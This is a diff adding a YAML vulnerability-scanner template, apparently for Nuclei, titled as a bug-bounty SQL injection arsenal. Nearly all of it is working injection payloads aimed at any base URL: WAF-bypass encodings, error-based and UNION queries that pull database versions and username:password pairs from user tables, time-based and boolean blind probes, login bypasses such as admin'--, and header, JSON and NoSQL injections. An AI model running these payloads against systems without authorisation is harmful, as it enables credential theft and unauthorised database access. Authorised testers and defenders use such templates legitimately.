@@ -1,0 +1,750 @@
+id: bug-bounty-sqli-ultimate
+
+info:
+  name: Ultimate SQL Injection Detection - Bug Bounty Arsenal
+  author: ezrec
+  severity: critical
+  description: |
+    Ultimate SQL Injection detection with WAF bypasses, advanced payloads from HackerOne reports,
+    GitHub research, and real-world bug bounty findings. Includes error-based, blind, time-based,
+    union-based, boolean-based, and second-order SQL injection techniques.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-89
+  tags: sqli,bug-bounty,sql-injection,database,waf-bypass,blind-sqli,time-based-sqli
+
+http:
+  # === BASIC ERROR-BASED SQL INJECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q='"
+      - "{{BaseURL}}/user?id='"
+      - "{{BaseURL}}/product?id='"
+      - "{{BaseURL}}/view?id='"
+      - "{{BaseURL}}/show?id='"
+      - "{{BaseURL}}/get?id='"
+      - "{{BaseURL}}/item?id='"
+      - "{{BaseURL}}/page?id='"
+      - "{{BaseURL}}/category?id='"
+      - "{{BaseURL}}/article?id='"
+      - "{{BaseURL}}/news?id='"
+      - "{{BaseURL}}/post?id='"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "mysql"
+          - "sql syntax"
+          - "ORA-"
+          - "PostgreSQL"
+          - "SQLite"
+          - "Microsoft OLE DB"
+          - "ODBC"
+          - "Warning: mysql"
+          - "Error: mysql"
+          - "mysqli"
+          - "PDO"
+          - "syntax error"
+          - "unexpected"
+          - "near"
+          - "quoted string"
+          - "unterminated quoted string"
+          - "syntax error at or near"
+          - "invalid input syntax"
+          - "column does not exist"
+          - "relation does not exist"
+          - "table doesn't exist"
+          - "unknown column"
+          - "ambiguous column"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: basic_sql_error
+        regex:
+          - 'mysql_.*error|mysqli.*error'
+          - 'ORA-[0-9]+'
+          - 'PostgreSQL.*ERROR'
+          - 'SQLite.*error'
+          - 'Microsoft.*ODBC.*error'
+          - 'SQL.*syntax.*error'
+        case-insensitive: true
+
+  # === WAF BYPASS TECHNIQUES ===
+  - method: GET
+    path:
+      # Comment-based bypasses
+      - "{{BaseURL}}/search?q=1'/**/UNION/**/SELECT/**/1,2,3--"
+      - "{{BaseURL}}/search?q=1'/**/OR/**/1=1--"
+      - "{{BaseURL}}/search?q=1'#UNION#SELECT#1,2,3#"
+      - "{{BaseURL}}/search?q=1'--+UNION--+SELECT--+1,2,3--"
+      
+      # Case variation bypasses
+      - "{{BaseURL}}/search?q=1' UnIoN SeLeCt 1,2,3--"
+      - "{{BaseURL}}/search?q=1' uNiOn sElEcT 1,2,3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,2,3--"
+      - "{{BaseURL}}/search?q=1' union select 1,2,3--"
+      
+      # URL encoding bypasses
+      - "{{BaseURL}}/search?q=1%27%20UNION%20SELECT%201,2,3--"
+      - "{{BaseURL}}/search?q=1%27%20OR%201=1--"
+      - "{{BaseURL}}/search?q=1%2527%2520UNION%2520SELECT%25201,2,3--"
+      
+      # Double URL encoding
+      - "{{BaseURL}}/search?q=1%2527%2520UNION%2520SELECT%25201,2,3--"
+      - "{{BaseURL}}/search?q=1%252527%252520UNION%252520SELECT%2525201,2,3--"
+      
+      # Unicode bypasses
+      - "{{BaseURL}}/search?q=1\u0027\u0020UNION\u0020SELECT\u00201,2,3--"
+      - "{{BaseURL}}/search?q=1\x27\x20UNION\x20SELECT\x201,2,3--"
+      
+      # Space bypasses
+      - "{{BaseURL}}/search?q=1'/**/UNION/**/SELECT/**/1,2,3--"
+      - "{{BaseURL}}/search?q=1'%09UNION%09SELECT%091,2,3--"
+      - "{{BaseURL}}/search?q=1'%0aUNION%0aSELECT%0a1,2,3--"
+      - "{{BaseURL}}/search?q=1'%0dUNION%0dSELECT%0d1,2,3--"
+      - "{{BaseURL}}/search?q=1'%a0UNION%a0SELECT%a01,2,3--"
+      - "{{BaseURL}}/search?q=1'+UNION+SELECT+1,2,3--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "mysql"
+          - "sql"
+          - "database"
+          - "syntax error"
+          - "unexpected"
+          - "quoted string"
+          - "unterminated"
+          - "ORA-"
+          - "PostgreSQL"
+          - "SQLite"
+          - "UNION"
+          - "SELECT"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: waf_bypass_sqli
+        regex:
+          - 'mysql.*error|mysqli.*error'
+          - 'sql.*syntax.*error'
+          - 'quoted.*string.*not.*terminated'
+
+  # === ADVANCED ERROR-BASED TECHNIQUES ===
+  - method: GET
+    path:
+      # MySQL error-based
+      - "{{BaseURL}}/search?q=1' AND extractvalue(1,concat(0x7e,version(),0x7e))--"
+      - "{{BaseURL}}/search?q=1' AND extractvalue(1,concat(0x7e,user(),0x7e))--"
+      - "{{BaseURL}}/search?q=1' AND extractvalue(1,concat(0x7e,database(),0x7e))--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT(user(),FLOOR(RAND(0)*2)))--"
+      
+      # PostgreSQL error-based
+      - "{{BaseURL}}/search?q=1' AND CAST(version() AS int)--"
+      - "{{BaseURL}}/search?q=1' AND CAST(user AS int)--"
+      - "{{BaseURL}}/search?q=1' AND CAST(current_database() AS int)--"
+      
+      # SQL Server error-based
+      - "{{BaseURL}}/search?q=1' AND CONVERT(int,@@version)--"
+      - "{{BaseURL}}/search?q=1' AND CONVERT(int,user_name())--"
+      - "{{BaseURL}}/search?q=1' AND CONVERT(int,db_name())--"
+      
+      # Oracle error-based
+      - "{{BaseURL}}/search?q=1' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))=1--"
+      - "{{BaseURL}}/search?q=1' AND UTL_INADDR.get_host_name((SELECT banner FROM v$version WHERE rownum=1))=1--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "extractvalue"
+          - "Duplicate entry"
+          - "~"
+          - "invalid input syntax for type integer"
+          - "invalid input syntax for integer"
+          - "Conversion failed"
+          - "Error converting"
+          - "ORA-"
+          - "PLS-"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: error_based_sqli
+        regex:
+          - 'XPATH.*syntax.*error.*~([^~]+)~'
+          - 'Duplicate.*entry.*~([^~]+)~'
+          - 'invalid.*input.*syntax.*for.*integer.*"([^"]+)"'
+          - 'Conversion.*failed.*converting.*"([^"]+)"'
+
+  # === UNION-BASED SQL INJECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,version(),3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,user(),3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,database(),3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,@@version,3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,current_user,3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,table_name,3 FROM information_schema.tables--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,column_name,3 FROM information_schema.columns--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,concat(username,':',password),3 FROM users--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,concat(user,':',password),3 FROM admin--"
+      
+      # Different column counts
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,2--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,2,3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,2,3,4--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,2,3,4,5--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,2,3,4,5,6--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - '[0-9]+\.[0-9]+\.[0-9]+'
+          - 'MySQL|PostgreSQL|Microsoft|Oracle|SQLite'
+          - 'root@|admin@|user@|postgres@'
+          - 'information_schema'
+          - 'mysql\.user'
+          - 'pg_user'
+          - 'sys\.database_principals'
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: union_sqli
+        regex:
+          - 'MySQL ([0-9.]+)'
+          - 'PostgreSQL ([0-9.]+)'
+          - 'Microsoft SQL Server ([0-9.]+)'
+          - 'Oracle Database ([0-9.]+)'
+          - 'SQLite ([0-9.]+)'
+
+  # === TIME-BASED BLIND SQL INJECTION ===
+  - method: GET
+    path:
+      # MySQL time-based
+      - "{{BaseURL}}/search?q=1' AND SLEEP(5)--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT SLEEP(5))--"
+      - "{{BaseURL}}/search?q=1' AND IF(1=1,SLEEP(5),0)--"
+      - "{{BaseURL}}/search?q=1' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(5),0)--"
+      
+      # PostgreSQL time-based
+      - "{{BaseURL}}/search?q=1' AND pg_sleep(5)--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT pg_sleep(5))--"
+      - "{{BaseURL}}/search?q=1' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--"
+      
+      # SQL Server time-based
+      - "{{BaseURL}}/search?q=1'; WAITFOR DELAY '00:00:05'--"
+      - "{{BaseURL}}/search?q=1' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5)--"
+      
+      # Oracle time-based
+      - "{{BaseURL}}/search?q=1' AND DBMS_LOCK.SLEEP(5)=1--"
+      - "{{BaseURL}}/search?q=1' AND 1=(SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3,ALL_USERS t4,ALL_USERS t5)--"
+      
+      # SQLite time-based
+      - "{{BaseURL}}/search?q=1' AND randomblob(100000000)--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
+
+    extractors:
+      - type: regex
+        name: time_based_sqli
+        regex:
+          - 'SLEEP|WAITFOR|pg_sleep|DBMS_LOCK|randomblob'
+
+  # === BOOLEAN-BASED BLIND SQL INJECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=1' AND 1=1--"
+      - "{{BaseURL}}/search?q=1' AND 1=2--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM sysobjects)>0--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM pg_tables)>0--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM user_tables)>0--"
+      - "{{BaseURL}}/search?q=1' AND SUBSTRING(version(),1,1)='5'--"
+      - "{{BaseURL}}/search?q=1' AND SUBSTRING(user(),1,4)='root'--"
+      - "{{BaseURL}}/search?q=1' AND LENGTH(database())>5--"
+      - "{{BaseURL}}/search?q=1' AND ASCII(SUBSTRING(user(),1,1))>64--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "information_schema"
+          - "sysobjects"
+          - "pg_tables"
+          - "user_tables"
+          - "mysql"
+          - "postgresql"
+          - "mssql"
+          - "oracle"
+          - "sqlite"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: boolean_sqli
+        regex:
+          - 'information_schema|sysobjects|pg_tables|user_tables'
+
+  # === POST-BASED SQL INJECTION ===
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}/auth"
+      - "{{BaseURL}}/authenticate"
+      - "{{BaseURL}}/search"
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/register"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      username=admin'--&password=test&email=test@test.com&user=admin'--&login=admin'--&id=1'&search=test'&q=test'&query=test'&name=test'&message=test'&comment=test'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        words:
+          - "welcome"
+          - "dashboard"
+          - "profile"
+          - "logout"
+          - "admin"
+          - "success"
+          - "logged in"
+          - "mysql"
+          - "sql syntax"
+          - "ORA-"
+          - "PostgreSQL"
+          - "SQLite"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: post_sqli
+        regex:
+          - 'welcome|dashboard|profile|logout|admin|success'
+          - 'mysql.*error|sql.*error|database.*error'
+
+  # === HEADER-BASED SQL INJECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=test"
+
+    headers:
+      X-Forwarded-For: "1' OR 1=1--"
+      User-Agent: "Mozilla/5.0' OR 1=1--"
+      Referer: "http://example.com' OR 1=1--"
+      X-Real-IP: "127.0.0.1' OR 1=1--"
+      Cookie: "session=abc123' OR 1=1--; user=test' OR 1=1--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "mysql"
+          - "sql"
+          - "database"
+          - "syntax error"
+          - "unexpected"
+          - "ORA-"
+          - "PostgreSQL"
+          - "SQLite"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: header_sqli
+        regex:
+          - 'mysql.*error|sql.*error|database.*error'
+
+  # === SECOND-ORDER SQL INJECTION ===
+  - method: POST
+    path:
+      - "{{BaseURL}}/register"
+      - "{{BaseURL}}/profile/update"
+      - "{{BaseURL}}/settings/change"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      username=admin'+(SELECT+version())+--&email=test@test.com&password=test123&firstname=test'+(SELECT+user())+--&lastname=test'+(SELECT+database())+--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+    extractors:
+      - type: regex
+        name: second_order_sqli
+        regex:
+          - 'MySQL|PostgreSQL|Microsoft|Oracle|SQLite'
+
+  # === JSON-BASED SQL INJECTION ===
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/search"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/api/data"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {"id":"1' OR 1=1--","search":"test' UNION SELECT 1,version(),3--","query":"admin' AND SLEEP(5)--","user":"test' OR '1'='1","password":"test' OR '1'='1"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "mysql"
+          - "sql"
+          - "database"
+          - "syntax error"
+          - "ORA-"
+          - "PostgreSQL"
+          - "SQLite"
+          - "version"
+          - "user"
+          - "admin"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: json_sqli
+        regex:
+          - 'mysql.*error|sql.*error|database.*error'
+          - 'MySQL|PostgreSQL|Microsoft|Oracle|SQLite'
+
+  # === NOSQL INJECTION ===
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q[$ne]=null"
+      - "{{BaseURL}}/user?id[$ne]=null"
+      - "{{BaseURL}}/login?username[$ne]=null&password[$ne]=null"
+      - "{{BaseURL}}/api/user?id[$regex]=.*"
+      - "{{BaseURL}}/search?q[$where]=1"
+      - "{{BaseURL}}/data?filter[$gt]=0"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "mongodb"
+          - "mongoose"
+          - "nosql"
+          - "bson"
+          - "objectid"
+          - "collection"
+          - "document"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: nosql_injection
+        regex:
+          - 'mongodb|mongoose|nosql|bson'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=1'"
+      - "{{BaseURL}}/search?q=1' OR '1'='1"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1--"
+      - "{{BaseURL}}/user?id=1'"
+      - "{{BaseURL}}/user?id=1' OR '1'='1"
+      - "{{BaseURL}}/user?id=1' UNION SELECT 1,2,3--"
+      - "{{BaseURL}}/product?id=1'"
+      - "{{BaseURL}}/product?id=1' OR '1'='1"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "mysql"
+          - "sql"
+          - "database"
+          - "syntax error"
+          - "unexpected"
+          - "quoted string"
+          - "unterminated"
+          - "ORA-"
+          - "PostgreSQL"
+          - "SQLite"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: sqli_response
+        regex:
+          - 'mysql.*error|mysqli.*error'
+          - 'sql.*syntax.*error'
+          - 'quoted.*string.*not.*terminated'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM sysobjects)>0--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM pg_tables)>0--"
+      - "{{BaseURL}}/user?id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "information_schema"
+          - "sysobjects"
+          - "pg_tables"
+          - "mysql"
+          - "postgresql"
+          - "mssql"
+          - "oracle"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: sqli_injection
+        regex:
+          - 'information_schema|sysobjects|pg_tables'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,version(),3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,user(),3--"
+      - "{{BaseURL}}/search?q=1' UNION SELECT 1,database(),3--"
+      - "{{BaseURL}}/user?id=1' UNION SELECT 1,@@version,3--"
+      - "{{BaseURL}}/user?id=1' UNION SELECT 1,current_user,3--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - '[0-9]+\.[0-9]+\.[0-9]+'
+          - 'MySQL|PostgreSQL|Microsoft|Oracle'
+          - 'root@|admin@|user@'
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: sqli_union
+        regex:
+          - 'MySQL ([0-9.]+)'
+          - 'PostgreSQL ([0-9.]+)'
+          - 'Microsoft SQL Server ([0-9.]+)'
+          - 'Oracle Database ([0-9.]+)'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=1' AND SLEEP(5)--"
+      - "{{BaseURL}}/search?q=1'; WAITFOR DELAY '00:00:05'--"
+      - "{{BaseURL}}/search?q=1' AND pg_sleep(5)--"
+      - "{{BaseURL}}/user?id=1' AND SLEEP(5)--"
+      - "{{BaseURL}}/user?id=1'; WAITFOR DELAY '00:00:05'--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
+
+    extractors:
+      - type: regex
+        name: time_based_sqli
+        regex:
+          - 'SLEEP|WAITFOR|pg_sleep'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/signin"
+      - "{{BaseURL}}/auth"
+      - "{{BaseURL}}/authenticate"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: |
+      username=admin'--&password=test&email=test@test.com&user=admin'--&login=admin'--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        words:
+          - "welcome"
+          - "dashboard"
+          - "profile"
+          - "logout"
+          - "admin"
+          - "success"
+          - "logged in"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: auth_bypass
+        regex:
+          - 'welcome|dashboard|profile|logout|admin|success'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user?id=1'"
+      - "{{BaseURL}}/api/users?id=1'"
+      - "{{BaseURL}}/api/product?id=1'"
+      - "{{BaseURL}}/api/item?id=1'"
+      - "{{BaseURL}}/rest/user?id=1'"
+      - "{{BaseURL}}/rest/users?id=1'"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "mysql"
+          - "sql"
+          - "database"
+          - "syntax error"
+          - "unexpected"
+          - "ORA-"
+          - "PostgreSQL"
+          - "SQLite"
+          - "error"
+          - "exception"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: api_sqli
+        regex:
+          - 'mysql.*error|sql.*error|database.*error'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/search?q=1' AND extractvalue(1,concat(0x7e,version(),0x7e))--"
+      - "{{BaseURL}}/search?q=1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--"
+      - "{{BaseURL}}/user?id=1' AND extractvalue(1,concat(0x7e,user(),0x7e))--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "extractvalue"
+          - "Duplicate entry"
+          - "~"
+        condition: or
+        case-insensitive: true
+
+    extractors:
+      - type: regex
+        name: error_based_sqli
+        regex:
+          - 'XPATH.*syntax.*error.*~([^~]+)~'
+          - 'Duplicate.*entry.*~([^~]+)~'
